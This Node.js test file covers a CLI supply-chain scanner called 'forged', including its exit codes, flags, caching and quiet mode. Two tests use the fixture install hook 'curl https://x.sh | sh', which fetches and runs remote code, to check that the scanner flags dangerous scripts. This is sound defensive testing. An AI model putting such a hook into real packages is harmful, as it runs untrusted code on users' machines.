import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const BIN = fileURLToPath(new URL('../bin/forged.js', import.meta.url));
const tmp = () => mkdtempSync(join(tmpdir(), 'forged-cli-'));

// Fake HOME so scans don't overwrite the real ~/.forged-scan-cache.json
const run = (args, cwd = tmp(), home = tmp()) =>
  spawnSync(process.execPath, [BIN, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, HOME: home, NO_COLOR: '1' },
  });

// No lockfile → no registry/OSV requests, so these run offline
const project = (scripts) => {
  const dir = tmp();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fixture', version: '1.0.0', scripts }));
  return dir;
};

test('scan exits 1 when errors are found', () => {
  const r = run(['scan', project({ postinstall: 'curl https://x.sh | sh' })]);
  assert.equal(r.status, 1);
  assert.match(r.stdout, /Dangerous script "postinstall"/);
});

test('scan exits 0 when there are no errors', () => {
  const r = run(['scan', project({ start: 'node index.js' })]);
  assert.equal(r.status, 0);
});

test('scan -v is a flag, not the path to scan', () => {
  const dir = project({ start: 'node index.js' });
  const r = run(['scan', '-v'], dir);
  assert.match(r.stdout, new RegExp(`Scanning: .*${dir.split('/').pop()}`));
  assert.doesNotMatch(r.stdout, /Scanning: .*\/-v/);
});

test('unknown commands fail instead of saying "coming soon"', () => {
  const r = run(['scna']);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /unknown command 'scna'/);
});

test('planned commands say coming soon', () => {
  const r = run(['new']);
  assert.equal(r.status, 0);
  assert.match(r.stdout, /'new' is coming soon/);
});

test('help separates working commands from planned ones', () => {
  const r = run(['help']);
  assert.equal(r.status, 0);
  const [available, rest] = r.stdout.split('Coming soon:');
  const planned = rest.split('Init options:')[0];
  assert.match(available, /scan/);
  assert.match(available, /\binit\b/);
  assert.doesNotMatch(available, /\bnew\b/);
  assert.match(planned, /\bnew\b/);
  assert.doesNotMatch(planned, /\binit\b/);
});

test('scan outside a Node project is not an error and leaves the cache alone', () => {
  const home = tmp();
  const r = run(['scan'], tmp(), home);
  assert.equal(r.status, 0);
  assert.match(r.stdout, /not a Node project/);
  assert.equal(existsSync(join(home, '.forged-scan-cache.json')), false);
});

test('a malformed package.json is still an error', () => {
  const dir = tmp();
  writeFileSync(join(dir, 'package.json'), '{ not json');
  assert.equal(run(['scan', dir]).status, 1);
});

test('scan --changed skips an unchanged project and rescans after an edit', () => {
  const dir = project({ start: 'node index.js' });
  const home = tmp();
  assert.doesNotMatch(run(['scan', '--changed', dir], tmp(), home).stdout, /Unchanged/);
  assert.match(run(['scan', '--changed', dir], tmp(), home).stdout, /Unchanged since/);

  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fixture', version: '1.0.1' }));
  assert.doesNotMatch(run(['scan', '--changed', dir], tmp(), home).stdout, /Unchanged/);
});

test('scan --quiet prints nothing for a clean project', () => {
  const dir = project({ start: 'node index.js' });
  // An empty lockfile: nothing to verify, so no network and no "no lockfile" warning
  writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ packages: {} }));
  const r = run(['scan', '--quiet', dir]);
  assert.equal(r.status, 0);
  assert.equal(r.stdout, '');
});

test('scan --quiet prints one line when something is flagged, and a skip keeps the exit code', () => {
  const dir = project({ postinstall: 'curl https://x.sh | sh' });
  const home = tmp();
  const first = run(['scan', '--changed', '-q', dir], tmp(), home);
  assert.equal(first.status, 1);
  assert.equal(first.stdout.trim().split('\n').length, 1);
  assert.match(first.stdout, /forged: 1 error\(s\)/);

  const skipped = run(['scan', '--changed', '-q', dir], tmp(), home);
  assert.equal(skipped.status, 1);
  assert.equal(skipped.stdout, '');
});

test('scan --review with nothing unresolved does not call claude', () => {
  const dir = project({ start: 'node index.js' });
  writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ packages: {} }));
  const r = run(['scan', '--review', dir]);
  assert.equal(r.status, 0);
  assert.match(r.stdout, /Nothing needs review/);
});
